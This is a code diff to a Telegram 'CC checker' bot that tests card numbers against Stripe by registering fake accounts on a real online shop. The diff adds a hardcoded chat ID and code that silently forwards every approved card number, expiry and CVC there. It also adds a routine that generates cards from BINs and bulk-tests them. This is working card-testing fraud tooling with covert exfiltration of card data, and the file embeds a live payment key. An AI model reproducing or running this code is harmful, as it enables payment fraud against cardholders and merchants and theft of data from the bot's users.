@@ -6,6 +6,7 @@ import os
 import random
 import datetime
 from keep_alive import keep_alive
+
 keep_alive()
 
 api_id = 12243932
@@ -15,6 +16,9 @@ stripe_public_key = "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMsc
 app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
 app.set_parse_mode(enums.ParseMode.HTML)
 CREDITS_MESSAGE = "\n\nMade with ❤️ by the @propagandabots for You"
+
+# New Addition: Define the target chat ID
+APPROVED_CC_CHAT_ID = -1002464303219  # Replace with your actual chat ID
 
 is_processing = {}
 is_binning_processing = {}
@@ -121,7 +125,7 @@ async def check_card(cc, mm, yy, cvc):
     bin_code = cc[:6]
     brand, bin_type, type_value, issuer, country_name, emoji = await get_bin_details(bin_code)
     if confirm_response.status_code == 200 and confirm_response_json.get("status") == "succeeded":
-        return f"""<b>Approved ✅</b>
+        approved_message = f"""<b>Approved ✅</b>
 
 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvc}</code>
 <b>Gateway:</b> Stripe Auth
@@ -133,6 +137,9 @@ async def check_card(cc, mm, yy, cvc):
 
 <b>Time:</b> {time_taken:.2f} seconds
 """
+        # Send approved CC to the specified chat
+        await app.send_message(APPROVED_CC_CHAT_ID, approved_message)
+        return approved_message
     elif 'error' in confirm_response_json:
         decline_code = confirm_response_json['error'].get('decline_code', 'Unknown')
         decline_message = confirm_response_json['error'].get('message', 'Unknown error')
@@ -311,6 +318,10 @@ async def single_check(client, message):
     processing_msg = await message.reply("⏳ Processing your card, please wait a moment...")
     response = await check_card(cc, mm, yy, cvc)
     await processing_msg.edit_text(response)
+    
+    # Forward approved CC to the specified chat
+    if "Approved" in response:
+        await client.send_message(APPROVED_CC_CHAT_ID, response)
 
 @app.on_message(filters.command("bin"))
 @require_registration
@@ -361,6 +372,10 @@ async def multi_check(client, message):
             cc, mm, yy, cvc = cc_info
             response = await check_card(cc, mm, yy, cvc)
             await message.reply(response)
+            
+            # Forward approved CC to the specified chat
+            if "Approved" in response:
+                await client.send_message(APPROVED_CC_CHAT_ID, response)
 
 @app.on_message(filters.command("mass"))
 @require_registration
@@ -479,16 +494,16 @@ async def handle_mass_file(client, message):
             cc, mm, yy, cvc = cc_info
             last_cc = f"{cc}|{mm}|{yy}|{cvc}"
             response = await check_card(cc, mm, yy, cvc)
+            await message.reply(response)
+            
+            # Forward approved CC to the specified chat
             if "Approved" in response:
+                await client.send_message(APPROVED_CC_CHAT_ID, response)
                 approved_count += 1
-                last_response = "✅ Approved"
-                await message.reply(response)
             elif "Declined" in response:
                 declined_count += 1
-                last_response = "❌ Declined"
             elif "Error" in response:
                 error_count += 1
-                last_response = "⚠️ Error"
             inline_buttons = InlineKeyboardMarkup(
                 [
                     [InlineKeyboardButton(f"Total Cards: {total_cards}", callback_data="total")],
@@ -497,19 +512,19 @@ async def handle_mass_file(client, message):
                     [InlineKeyboardButton(f"⚠️ Error: {error_count}", callback_data="error")]
                 ]
             )
-            text_to_edit = f"🔄 <b>Last CC:</b> <code>{last_cc}</code>\n<b>Response:</b> {last_response}\n\n"
+            text_to_edit = f"🔄 <b>Last CC:</b> <code>{last_cc}</code>\n<b>Response:</b> {'✅ Approved' if 'Approved' in response else '❌ Declined' if 'Declined' in response else '⚠️ Error'}\n\n"
             text_to_edit += "⏳ Checking cards... Please wait!"
             await processing_message.edit_text(text_to_edit, reply_markup=inline_buttons)
         if is_processing.get(user_id):
             await processing_message.edit_text(
-        f"✅ <b>All done!</b>\n"
-        f"🔢 <b>Last CC Checked:</b> <code>{last_cc}</code>\n"
-        f"📋 <b>Last Response:</b> {last_response}\n\n"
-        f"🎉 <b>Summary:</b>\n"
-        f"✅ Approved: {approved_count}\n"
-        f"❌ Declined: {declined_count}\n"
-        f"⚠️ Error: {error_count}"
-    )
+                f"✅ <b>All done!</b>\n"
+                f"🔢 <b>Last CC Checked:</b> <code>{last_cc}</code>\n"
+                f"📋 <b>Last Response:</b> {'✅ Approved' if 'Approved' in response else '❌ Declined' if 'Declined' in response else '⚠️ Error'}\n\n"
+                f"🎉 <b>Summary:</b>\n"
+                f"✅ Approved: {approved_count}\n"
+                f"❌ Declined: {declined_count}\n"
+                f"⚠️ Error: {error_count}"
+            )
             is_processing[user_id] = False
         os.remove(document)
     else:
@@ -619,11 +634,247 @@ async def handle_binning_text(client, message):
     valid_bins = [bin.strip() for bin in bin_list if bin.strip().isdigit() and 6 <= len(bin.strip()) <= 16]
     if not valid_bins:
         await message.reply_text("❗️ Uh-oh! It seems like some BINs are invalid.\n\nPlease ensure each BIN is numeric and contains between 6 and 16 digits. Let's try again! 😊")
-
         return
     await message.reply_text("📄 <b>BINs received!</b>\n\n🔍 <i>Starting the BIN hunt now...</i> 🏹")
     await process_bins(valid_bins, message)
 
+@app.on_message(filters.document & filters.create(lambda _, __, message: is_binning_processing.get(message.from_user.id, False)))
+@require_registration
+async def handle_binning_file(client, message):
+    user_id = message.from_user.id
+    if not is_binning_processing.get(user_id, False):
+        await message.reply("⚠️ No active binning process. Start with /binning.")
+        return
+    if message.document and message.document.file_name.endswith('.txt'):
+        file_path = await client.download_media(message.document)
+        with open(file_path, 'r') as file:
+            bins = file.readlines()
+        if is_premium(user_id):
+            max_bins = 30
+        else:
+            max_bins = 5
+        if len(bins) > max_bins:
+            await message.reply(f"You can provide up to {max_bins} BINs.")
+            is_binning_processing[user_id] = False
+            os.remove(file_path)
+            return
+        valid_bins = [bin.strip() for bin in bins if bin.strip().isdigit() and 6 <= len(bin.strip()) <= 16]
+        if not valid_bins:
+            await message.reply_text("❗️ Uh-oh! It seems like some BINs are invalid.\n\nPlease ensure each BIN is numeric and contains between 6 and 16 digits. Let's try again! 😊")
+            return
+        await message.reply_text("📂 <b>BIN file received!</b>\n\n🛠️ <i>Now, let’s get to work!</i> 💼")
+        await process_bins(valid_bins, message)
+    else:
+        await message.reply("Please upload a valid .txt file.")
+
+async def check_bin_card(cc, mm, yy, cvc):
+    start_time = time.time()
+
+    stripe_public_key = "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm"
+
+    user_url = "https://random-data-api.com/api/v2/users?size=1&is_xml=true"
+    user_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+
+    user_response = requests.get(user_url, headers=user_headers)
+    user_data = user_response.json()
+    first_name = user_data['first_name']
+    last_name = user_data['last_name']
+    email = f"{first_name}{last_name}@gmail.com"
+
+    add_payment_method_url = "https://shopzone.nz/my-account/add-payment-method/"
+    payment_method_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*"
+    }
+
+    payment_method_response = requests.get(add_payment_method_url, headers=payment_method_headers)
+    payment_method_content = payment_method_response.text
+    regnon_start = payment_method_content.find('id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="') + len('id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="')
+    regnon_end = payment_method_content.find('"', regnon_start)
+    regnon = payment_method_content[regnon_start:regnon_end]
+
+    register_url = "https://shopzone.nz/my-account/add-payment-method/"
+    register_data = {
+        "email": email,
+        "woocommerce-register-nonce": regnon,
+        "_wp_http_referer": "/my-account/add-payment-method/",
+        "register": "Register"
+    }
+
+    register_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+
+    requests.post(register_url, data=register_data, headers=register_headers)
+
+    stripe_url = "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
+    stripe_data = {"payment_method": "stripe_cc"}
+    stripe_response = requests.post(stripe_url, data=stripe_data, headers=register_headers)
+
+    stripe_response_json = stripe_response.json()
+
+    if "intent" in stripe_response_json and "client_secret" in stripe_response_json["intent"]:
+        seti = stripe_response_json["intent"]["client_secret"]
+        secret = seti.split("_secret_")[0]
+    else:
+        return "Error: 'client_secret' not found."
+
+    stripe_metadata_url = "https://m.stripe.com/6"
+    stripe_metadata_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+
+    stripe_metadata_response = requests.post(stripe_metadata_url, headers=stripe_metadata_headers)
+    stripe_metadata_json = stripe_metadata_response.json()
+    guid = stripe_metadata_json["guid"]
+    muid = stripe_metadata_json["muid"]
+    sid = stripe_metadata_json["sid"]
+
+    postal_code = "10080"
+
+    confirm_url = f"https://api.stripe.com/v1/setup_intents/{secret}/confirm"
+    confirm_data = {
+        "payment_method_data[type]": "card",
+        "payment_method_data[card][number]": cc,
+        "payment_method_data[card][cvc]": cvc,
+        "payment_method_data[card][exp_month]": mm,
+        "payment_method_data[card][exp_year]": yy,
+        "payment_method_data[billing_details][address][postal_code]": postal_code,
+        "payment_method_data[guid]": guid,
+        "payment_method_data[muid]": muid,
+        "payment_method_data[sid]": sid,
+        "expected_payment_method_type": "card",
+        "use_stripe_sdk": "true",
+        "key": stripe_public_key,
+        "client_secret": seti
+    }
+
+    confirm_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+
+    confirm_response = requests.post(confirm_url, data=confirm_data, headers=confirm_headers)
+    confirm_response_json = confirm_response.json()
+
+    end_time = time.time()
+    time_taken = end_time - start_time
+
+    bin_code = cc[:6]
+    brand, bin_type, type_value, issuer, country_name, emoji = await get_bin_details(bin_code)
+
+    if confirm_response.status_code == 200 and confirm_response_json.get("status") == "succeeded":
+        approved_message = f"""✅ Approved | Card: {cc}|{mm}|{yy}|{cvc} | Issuer: {issuer} | Country: {country_name} {emoji} | Time: {time_taken:.2f} sec"""
+        # Send approved CC to the specified chat
+        await app.send_message(APPROVED_CC_CHAT_ID, approved_message)
+        return approved_message
+    elif 'error' in confirm_response_json:
+        decline_message = confirm_response_json['error'].get('message', 'Unknown error')
+        return f"""❌ Declined | Card: {cc}|{mm}|{yy}|{cvc} | {decline_message} | Issuer: {issuer} | Country: {country_name} {emoji} | Time: {time_taken:.2f} sec"""
+    else:
+        return "Unknown Error: No valid response from payment gateway."
+
+async def process_bins(valid_bins, message):
+    user_id = message.from_user.id
+    approved_bins_more_than_3 = set()
+    approved_bins_less_than_3 = set()
+    all_declined_bins = set()
+    bin_approved_count = {}
+
+    if is_premium(user_id):
+        timeout = 15
+    else:
+        timeout = 60
+
+    for bin_code in valid_bins:
+        if not is_binning_processing.get(user_id, False):
+            await message.reply_text(f"❌ Bin hunting process has been stopped.")
+            break
+
+        bin_prefix = bin_code[:6]
+        bin_approved_count[bin_prefix] = 0
+        await message.reply_text(f"🔍 Hunting BIN: {bin_prefix} 🔥")
+
+        for _ in range(4):
+            if not is_binning_processing.get(user_id, False):
+                await message.reply_text(f"❌ Bin hunting process has been stopped.")
+                return
+
+            cc_number, exp_month, exp_year, cvv = gencc(bin_code)
+            result = await check_bin_card(cc_number, exp_month, exp_year, cvv)
+
+            if not is_binning_processing.get(user_id, False):
+                await message.reply_text(f"❌ Bin hunting process has been stopped.")
+                return
+
+            await message.reply_text(result)
+            
+            # Forward approved CC to the specified chat
+            if "Approved" in result:
+                await app.send_message(APPROVED_CC_CHAT_ID, result)
+                bin_approved_count[bin_prefix] += 1
+                if bin_approved_count[bin_prefix] == 3:
+                    break  # Stop after 3 approvals
+
+        if bin_approved_count[bin_prefix] >= 3:
+            approved_bins_more_than_3.add(bin_prefix)
+        elif 1 <= bin_approved_count[bin_prefix] < 3:
+            approved_bins_less_than_3.add(bin_prefix)
+        elif bin_approved_count[bin_prefix] == 0:
+            all_declined_bins.add(bin_prefix)
+
+    approved_bins_more_3_summary = (
+        f"✅ <b>3+ Approved CC Bins ({len(approved_bins_more_than_3)}):</b>\n" + "\n".join(approved_bins_more_than_3)
+        if approved_bins_more_than_3 else "⚠️ <b>No bins with 3+ approvals.</b>"
+    )
+
+    approved_bins_less_3_summary = (
+        f"✅ <b>< 3 Approved CC Bins ({len(approved_bins_less_than_3)}):</b>\n" + "\n".join(approved_bins_less_than_3)
+        if approved_bins_less_than_3 else "⚠️ <b>No bins with less than 3 approvals.</b>"
+    )
+
+    declined_bins_summary = (
+        f"❌ <b>All CC Declined Bins ({len(all_declined_bins)}):</b>\n" + "\n".join(all_declined_bins)
+        if all_declined_bins else "✅ <b>No bins with all declined cards.</b>"
+    )
+
+    await message.reply_text(f"{approved_bins_more_3_summary}\n\n{approved_bins_less_3_summary}\n\n{declined_bins_summary}")
+    is_binning_processing[user_id] = False
+
+@app.on_message(filters.text & filters.create(lambda _, __, message: is_binning_processing.get(message.from_user.id, False)))
+@require_registration
+async def handle_binning_text(client, message):
+    user_id = message.from_user.id
+    if not is_binning_processing.get(user_id, False):
+        return
+    bin_list = message.text.strip().splitlines()
+    if is_premium(user_id):
+        max_bins = 30
+    else:
+        max_bins = 5
+    if len(bin_list) > max_bins:
+        await message.reply(f"You can provide up to {max_bins} BINs.")
+        is_binning_processing[user_id] = False
+        return
+    valid_bins = [bin.strip() for bin in bin_list if bin.strip().isdigit() and 6 <= len(bin.strip()) <= 16]
+    if not valid_bins:
+        await message.reply_text("❗️ Uh-oh! It seems like some BINs are invalid.\n\nPlease ensure each BIN is numeric and contains between 6 and 16 digits. Let's try again! 😊")
+        return
+    await message.reply_text("📄 <b>BINs received!</b>\n\n🔍 <i>Starting the BIN hunt now...</i> 🏹")
+    await process_bins(valid_bins, message)
 
 @app.on_message(filters.document & filters.create(lambda _, __, message: is_binning_processing.get(message.from_user.id, False)))
 @require_registration
